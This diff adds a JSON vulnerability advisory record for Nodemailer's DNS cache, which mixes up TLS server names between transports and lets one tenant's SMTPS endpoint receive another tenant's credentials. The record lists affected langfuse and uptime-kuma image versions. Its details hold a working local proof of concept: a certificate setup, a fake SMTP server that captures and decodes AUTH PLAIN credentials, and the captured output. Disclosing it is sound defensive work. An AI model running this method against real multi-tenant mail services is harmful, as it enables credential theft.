@@ -1,0 +1,305 @@
+{
+  "schema_version": "1.8.0",
+  "id": "DHI-xlhw-ulsh-z2bt-wndj",
+  "modified": "2026-11-19T21:02:33Z",
+  "published": "2026-11-19T21:02:33Z",
+  "upstream": [
+    "GHSA-6vj9-mwq6-2f5v"
+  ],
+  "summary": "### Summary",
+  "details": "### Summary\n\nNodemailer's process-global DNS cache is keyed only by `host`, but each cache entry also stores the caller-specific TLS `servername`. When two direct SMTPS transports use the same DNS host with different `tls.servername` values, the first transport's server name is returned to the second transport and overwrites its explicitly configured value.\n\nAs a result, Nodemailer sends the wrong SNI value and verifies the peer certificate against the wrong identity. In a multi-tenant service or SNI-routed SMTP gateway, one tenant can prime the cache so that a victim transport connects to the attacker's TLS virtual host, accepts the attacker's certificate with `rejectUnauthorized: true`, and sends the victim's SMTP credentials to it.\n\n## Affected component\n\n- **Ecosystem:** npm\n- **Package:** `nodemailer`\n- **Repository:** https://github.com/nodemailer/nodemailer\n- **Tested version:** `10.0.1`\n- **Tested commit:** `40d52215aac65b811d7e131bc916f68605efd9d2`\n- **Runtime-confirmed vulnerable versions:** `5.0.0` and `10.0.1`\n- **Affected versions:** `>= 5.0.0, <= 10.0.1`\n- **Patched versions:** None known at the time of this report\n- **Affected mode:** Direct TLS/SMTPS connections (`secure: true`) where different transports use the same non-IP `host` and different TLS `servername` values\n\nThe vulnerable cache implementation was introduced in commit `6859b5dd96c8d9f0070a3169a877181b71df4a3b` on 2018-12-28. Git history shows `v5.0.0` as the first release tag containing that commit. The behavior remains present in `v10.0.1`.\n\n## Details\n\n### Root cause\n\n`src/shared/index.ts` defines one module-global DNS cache, keyed only by the DNS host:\n\n```ts\nexport const dnsCache = new Map<string, DnsCacheEntry>();\n```\n\nAlthough the cache key contains only `host`, the cached value contains both DNS addresses and the request-specific TLS identity:\n\n```ts\nconst value: DnsCacheValue = {\n    addresses: allAddresses,\n    servername: options.servername || host\n};\n\ndnsCache.set(host, {\n    value,\n    expires: Date.now() + (options.dnsTtl || DNS_TTL)\n});\n```\n\nOn a cache hit, `resolveHostname()` returns the cached `servername` without considering the current call's `options.servername`:\n\n```ts\nif (!cached.expires || cached.expires >= now) {\n    return callback(\n        null,\n        formatDNSValue(cached.value, {\n            cached: true\n        })\n    );\n}\n```\n\n`formatDNSValue()` copies that stale value into the result:\n\n```ts\nreturn Object.assign(\n    {\n        servername: value.servername,\n        host,\n        _addresses: addresses\n    },\n    extra || {}\n);\n```\n\nFor a direct TLS connection, `SMTPConnection.connect()` initially copies the current transport's TLS configuration into `opts`. `_resolveAndConnect()` then overwrites every truthy field with the cached resolver result, including `opts.servername`:\n\n```ts\nObject.assign(opts, this.options.tls || {});\n\nif (this.servername && !opts.servername) {\n    opts.servername = this.servername;\n}\n\nreturn this._resolveAndConnect(opts, resolved => {\n    this._connectToHost(opts, this.secureConnection);\n});\n```\n\n```ts\nfor (const key of Object.keys(resolved!)) {\n    if (key.charAt(0) !== '_' && (resolved as { [key: string]: any })[key]) {\n        (opts as { [key: string]: any })[key] = (resolved as { [key: string]: any })[key];\n    }\n}\n```\n\nThe resulting `opts` object is passed to `tls.connect()`. Node therefore sends the cached server name as SNI and verifies the certificate against that cached name, rather than against the server name explicitly configured for the current transport.\n\nThe default DNS cache TTL is five minutes:\n\n```ts\nconst DNS_TTL = 5 * 60 * 1000;\n```\n\n### Code path\n\n```text\nTenant A: createTransport({ host: H, secure: true,\n                            tls: { servername: attackerName } })\n  -> SMTPConnection.connect()\n  -> _resolveAndConnect(opts)\n  -> shared.resolveHostname({ host: H, servername: attackerName })\n  -> dnsCache.set(H, { addresses, servername: attackerName })\n\nVictim: createTransport({ host: H, secure: true,\n                          tls: { servername: victimName } })\n  -> SMTPConnection.connect()\n  -> opts.servername = victimName\n  -> _resolveAndConnect(opts)\n  -> shared.resolveHostname({ host: H, servername: victimName })\n  -> dnsCache.get(H)\n  -> returns cached servername = attackerName\n  -> _resolveAndConnect overwrites opts.servername\n  -> tls.connect({ servername: attackerName })\n  -> attacker SNI virtual host and certificate are selected\n  -> AUTH transmits victim SMTP credentials\n```\n\n### Relevant source locations in the tested revision\n\n- `src/shared/index.ts:184` — five-minute default cache TTL\n- `src/shared/index.ts:245` — process-global cache keyed by host\n- `src/shared/index.ts:247-262` — cached `servername` returned by `formatDNSValue()`\n- `src/shared/index.ts:292-323` — host-only lookup and cache-hit return\n- `src/shared/index.ts:350-359` — caller-specific `servername` stored in host-only cache\n- `src/smtp-connection/index.ts:713-729` — direct TLS options and resolver call\n- `src/smtp-connection/index.ts:741-763` — cached fields overwrite current connection options\n\n## PoC\n\n### Prerequisites\n\n- Node.js 20 (tested with Node.js `20.20.2`)\n- A checkout/build of Nodemailer `10.0.1`\n- OpenSSL to generate the local test certificate\n\nNo external SMTP server or network access is required.\n\n### 1. Generate a certificate for only `attacker.test`\n\nCreate `openssl.cnf`:\n\n```ini\n[req]\ndistinguished_name = dn\nx509_extensions = ext\nprompt = no\n\n[dn]\nCN = attacker.test\n\n[ext]\nsubjectAltName = DNS:attacker.test\nbasicConstraints = critical,CA:TRUE\nkeyUsage = critical,digitalSignature,keyEncipherment,keyCertSign\nextendedKeyUsage = serverAuth\n```\n\nGenerate the certificate and private key:\n\n```bash\nopenssl req -x509 -newkey rsa:2048 -nodes -days 1 \\\n  -keyout attacker-key.pem -out attacker-cert.pem -config openssl.cnf\n```\n\n### 2. Save the following as `poc-dns-cache-servername-confusion.mjs`\n\nAdjust the two import paths if the PoC is not saved beside the repository checkout.\n\n```js\nimport fs from 'node:fs';\nimport tls from 'node:tls';\nimport nodemailer from '../../nodemailer/dist/esm/nodemailer.js';\nimport * as shared from '../../nodemailer/dist/esm/shared/index.js';\n\nconst cert = fs.readFileSync(new URL('./tls-fixture/attacker-cert.pem', import.meta.url));\nconst key = fs.readFileSync(new URL('./tls-fixture/attacker-key.pem', import.meta.url));\nconst observedSni = [];\nconst observedAuth = [];\n\nconst server = tls.createServer({ key, cert }, socket => {\n    observedSni.push(socket.servername);\n    socket.write('220 attacker.test ESMTP\\r\\n');\n    let input = '';\n    socket.on('data', chunk => {\n        input += chunk.toString();\n        let end;\n        while ((end = input.indexOf('\\r\\n')) >= 0) {\n            const line = input.slice(0, end);\n            input = input.slice(end + 2);\n            if (/^EHLO /i.test(line)) {\n                socket.write('250-attacker.test\\r\\n250 AUTH PLAIN\\r\\n');\n            } else if (/^AUTH /i.test(line)) {\n                observedAuth.push(line);\n                socket.write('235 2.7.0 Authentication successful\\r\\n');\n            } else if (/^QUIT/i.test(line)) {\n                socket.end('221 Bye\\r\\n');\n            } else {\n                socket.write('250 OK\\r\\n');\n            }\n        }\n    });\n});\n\nawait new Promise(resolve => server.listen(0, '127.0.0.1', resolve));\n\ntry {\n    shared.dnsCache.clear();\n\n    // Tenant A seeds the process-global cache for the shared DNS host.\n    const attackerTransport = nodemailer.createTransport({\n        host: 'localhost',\n        port: server.address().port,\n        secure: true,\n        auth: { user: 'attacker@example.test', pass: 'attacker-secret' },\n        tls: {\n            ca: cert,\n            servername: 'attacker.test',\n            rejectUnauthorized: true\n        }\n    });\n    await attackerTransport.verify();\n    attackerTransport.close();\n\n    // The victim explicitly configures a different TLS identity.\n    const victimTransport = nodemailer.createTransport({\n        host: 'localhost',\n        port: server.address().port,\n        secure: true,\n        auth: { user: 'victim@example.test', pass: 'victim-secret' },\n        tls: {\n            ca: cert,\n            servername: 'victim.test',\n            rejectUnauthorized: true\n        }\n    });\n    await victimTransport.verify();\n    victimTransport.close();\n\n    const decoded = observedAuth.map(line =>\n        line.startsWith('AUTH PLAIN ')\n            ? Buffer.from(line.slice('AUTH PLAIN '.length), 'base64').toString()\n            : null\n    );\n\n    console.log(JSON.stringify({\n        attackerConfiguredServername: 'attacker.test',\n        victimConfiguredServername: 'victim.test',\n        serverObservedSniForBothConnections: observedSni,\n        serverReceivedCredentials: decoded\n    }, null, 2));\n} finally {\n    shared.dnsCache.clear();\n    await new Promise(resolve => server.close(resolve));\n}\n```\n\n### 3. Build and run\n\nFrom the Nodemailer checkout:\n\n```bash\nnpm install\nnpm run build\nnode ../audit/nodemailer/poc-dns-cache-servername-confusion.mjs\n```\n\n### Observed result\n\n```json\n{\n  \"attackerConfiguredServername\": \"attacker.test\",\n  \"victimConfiguredServername\": \"victim.test\",\n  \"serverObservedSniForBothConnections\": [\n    \"attacker.test\",\n    \"attacker.test\"\n  ],\n  \"serverReceivedCredentials\": [\n    \"\\\\u0000attacker@example.test\\\\u0000attacker-secret\",\n    \"\\\\u0000victim@example.test\\\\u0000victim-secret\"\n  ]\n}\n```\n\nThe victim configured `victim.test`, but the server observes `attacker.test` for both handshakes. The local certificate contains only `attacker.test`, yet the victim connection succeeds with `rejectUnauthorized: true` and then sends the victim's username and password.\n\n### Expected result\n\nThe second connection must use `victim.test` for SNI and certificate hostname verification. With the PoC certificate, it should fail with a hostname mismatch before SMTP authentication occurs. It must never transmit victim credentials after validating the peer as `attacker.test`.\n\n## Impact\n\nThe vulnerability affects long-running applications that create multiple Nodemailer transports in one process and let separate tenants or security domains configure transports that share a DNS `host`. A practical example is an email platform whose SMTP gateway uses SNI to route several customer-specific SMTP endpoints behind one hostname.\n\nAn attacker who can create or exercise one transport can prime the global cache with the shared host and the attacker's `tls.servername`. During the cache lifetime, a victim's direct SMTPS connection to that host can:\n\n1. send the attacker's server name as SNI;\n2. be routed to the attacker's TLS virtual host;\n3. validate the attacker's certificate against the stale name, even though strict certificate validation is enabled; and\n4. transmit the victim's SMTP username and password to that endpoint.\n\nPossession of SMTP credentials may also let the attacker read or change mail account state where the provider reuses those credentials, or send mail as the victim. The exact secondary impact depends on the SMTP provider.\n\nWhere the attacker cannot control an SNI virtual host, stale cross-transport SNI can still cause certificate mismatch failures and cross-tenant availability impact.\n\n### Preconditions and limitations\n\n- Two transports must execute in the same Node.js process within the cache lifetime.\n- They must use the same non-IP `host` cache key and different `tls.servername` values.\n- Credential interception requires an endpoint or gateway that routes connections using SNI, or another deployment where the attacker controls the endpoint selected by the stale name.\n- The demonstrated path uses direct SMTPS (`secure: true`). The STARTTLS upgrade path constructs TLS options separately and is not claimed vulnerable by this report.\n\n## Suggested remediation\n\nThe DNS cache should store DNS data only. `servername` is connection-specific TLS policy and should not be persisted in a cache keyed solely by hostname.\n\nOne approach is to remove `servername` from `DnsCacheValue` and derive the returned value from the current request on every path:\n\n```ts\nreturn {\n    host: selectedAddress,\n    servername: options.servername || options.host || false,\n    _addresses: addresses,\n    cached: true\n};\n```\n\nAs defense in depth, `_resolveAndConnect()` should not overwrite an explicitly configured `opts.servername` with resolver metadata. Keying the cache by both host and server name would avoid this particular collision, but keeping TLS identity out of a DNS-address cache provides a cleaner separation.\n\nA regression test should create two direct-TLS transports in the same process with the same DNS host and different explicit server names, then assert that each TLS connection observes and verifies its own configured name regardless of cache order.",
+  "severity": [
+    {
+      "type": "CVSS_V3",
+      "score": "CVSS:3.1/AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:L/A:N"
+    }
+  ],
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-2",
+        "purl": "pkg:deb/dhi/langfuse-2"
+      },
+      "versions": [
+        "2.95.12-0",
+        "2.95.12-1",
+        "2.95.12-10",
+        "2.95.12-11",
+        "2.95.12-12",
+        "2.95.12-13",
+        "2.95.12-2",
+        "2.95.12-3",
+        "2.95.12-4",
+        "2.95.12-5",
+        "2.95.12-6",
+        "2.95.12-7",
+        "2.95.12-8",
+        "2.95.12-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-3",
+        "purl": "pkg:deb/dhi/langfuse-3"
+      },
+      "versions": [
+        "3.225.0-0",
+        "3.225.0-1",
+        "3.225.1-0",
+        "3.225.1-1",
+        "3.225.10-0",
+        "3.225.11-0",
+        "3.225.12-0",
+        "3.225.12-1",
+        "3.225.12-2",
+        "3.225.14-0",
+        "3.225.15-0",
+        "3.225.15-1",
+        "3.225.15-2",
+        "3.225.2-0",
+        "3.225.3-0",
+        "3.225.4-0",
+        "3.225.5-0",
+        "3.225.5-1",
+        "3.225.7-0",
+        "3.225.7-1",
+        "3.225.8-0",
+        "3.225.8-1",
+        "3.225.9-0",
+        "3.227.0-0",
+        "3.227.0-1",
+        "3.227.1-0",
+        "3.227.1-1",
+        "3.227.1-2"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-4",
+        "purl": "pkg:deb/dhi/langfuse-4"
+      },
+      "versions": [
+        "4.10.0-0",
+        "4.11.0-0",
+        "4.12.0-0",
+        "4.13.0-0",
+        "4.14.0-0",
+        "4.15.0-0",
+        "4.26.0-0",
+        "4.3.1-0",
+        "4.36.1-0",
+        "4.38.0-0",
+        "4.4.0-0",
+        "4.41.0-0",
+        "4.43.0-0",
+        "4.44.0-0",
+        "4.46.0-0",
+        "4.47.0-0",
+        "4.48.0-0",
+        "4.5.0-0",
+        "4.5.0-1",
+        "4.50.0-0",
+        "4.53.0-0",
+        "4.6.0-0",
+        "4.63.0-0",
+        "4.67.0-0",
+        "4.69.0-0",
+        "4.70.0-0",
+        "4.70.1-0",
+        "4.71.0-0",
+        "4.71.0-1",
+        "4.72.0-1",
+        "4.74.0-0",
+        "4.75.0-0",
+        "4.76.0-0",
+        "4.76.0-1",
+        "4.77.0-0",
+        "4.78.0-0",
+        "4.79.0-0",
+        "4.79.0-1",
+        "4.80.0-0",
+        "4.80.0-1",
+        "4.81.0-0",
+        "4.82.0-0",
+        "4.9.0-0"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "langfuse-worker-3",
+        "purl": "pkg:deb/dhi/langfuse-worker-3"
+      },
+      "versions": [
+        "3.174.1-1",
+        "3.186.0-0",
+        "3.187.0-0",
+        "3.187.0-1",
+        "3.188.0-0",
+        "3.191.0-0",
+        "3.191.0-1",
+        "3.193.0-0",
+        "3.194.0-0",
+        "3.194.1-0",
+        "3.194.1-1",
+        "3.195.0-0",
+        "3.197.1-0",
+        "3.198.0-0",
+        "3.200.0-0",
+        "3.201.1-0",
+        "3.202.1-0",
+        "3.203.1-0",
+        "3.203.3-0",
+        "3.204.0-0",
+        "3.205.0-0",
+        "3.205.1-0",
+        "3.206.0-0",
+        "3.208.0-0",
+        "3.210.0-0",
+        "3.212.0-0",
+        "3.213.0-0",
+        "3.214.0-0",
+        "3.216.0-0",
+        "3.216.0-1",
+        "3.218.0-0",
+        "3.219.0-0",
+        "3.221.1-0",
+        "3.222.0-0",
+        "3.222.0-1",
+        "3.223.0-0",
+        "3.224.0-0",
+        "3.224.1-0",
+        "3.224.1-1",
+        "3.224.2-0",
+        "3.224.2-1",
+        "3.224.3-0",
+        "3.224.3-1",
+        "3.225.0-0",
+        "3.225.0-1",
+        "3.225.0-2",
+        "3.225.0-3",
+        "3.225.1-0",
+        "3.225.1-1",
+        "3.225.1-2",
+        "3.225.10-0",
+        "3.225.11-0",
+        "3.225.12-0",
+        "3.225.12-1",
+        "3.225.14-0",
+        "3.225.15-0",
+        "3.225.15-2",
+        "3.225.3-0",
+        "3.225.3-1",
+        "3.225.4-0",
+        "3.225.5-0",
+        "3.225.7-0",
+        "3.225.8-0",
+        "3.225.9-0",
+        "3.227.0-0",
+        "3.227.0-1",
+        "3.227.0-2",
+        "3.227.1-0",
+        "3.227.1-1",
+        "3.227.1-2",
+        "3.227.1-3"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-1",
+        "purl": "pkg:deb/dhi/uptime-kuma-1"
+      },
+      "versions": [
+        "1.23.17-0",
+        "1.23.17-1",
+        "1.23.17-11",
+        "1.23.17-2",
+        "1.23.17-3",
+        "1.23.17-4",
+        "1.23.17-5",
+        "1.23.17-6",
+        "1.23.17-7",
+        "1.23.17-8",
+        "1.23.17-9"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    },
+    {
+      "package": {
+        "ecosystem": "Docker Hardened Images:Debian:13",
+        "name": "uptime-kuma-2",
+        "purl": "pkg:deb/dhi/uptime-kuma-2"
+      },
+      "versions": [
+        "2.5.0-0",
+        "2.5.0-1",
+        "2.5.0-2",
+        "2.5.10-0",
+        "2.5.11-0",
+        "2.5.11-1",
+        "2.5.11-2",
+        "2.5.11-3",
+        "2.5.12-0",
+        "2.5.3-0",
+        "2.5.3-1",
+        "2.5.4-0",
+        "2.5.5-0",
+        "2.5.5-1",
+        "2.5.6-0",
+        "2.5.7-0",
+        "2.5.7-1",
+        "2.5.9-0",
+        "2.5.9-1"
+      ],
+      "database_specific": {
+        "owner_kind": "HSP"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "ADVISORY",
+      "url": "https://scout.docker.com/v/DHI-xlhw-ulsh-z2bt-wndj"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/advisories/GHSA-6vj9-mwq6-2f5v"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://github.com/nodemailer/nodemailer/security/advisories/GHSA-6vj9-mwq6-2f5v"
+    },
+    {
+      "type": "FIX",
+      "url": "https://github.com/nodemailer/nodemailer/commit/a6512dbcb3c6e7f2f70d3acccc5752defe3c61fe"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/nodemailer/nodemailer/releases/tag/v10.0.2"
+    }
+  ],
+  "database_specific": {
+    "coverage": "partial",
+    "coverage_exclusions": [
+      "legacy_package_image_owner"
+    ]
+  }
+}
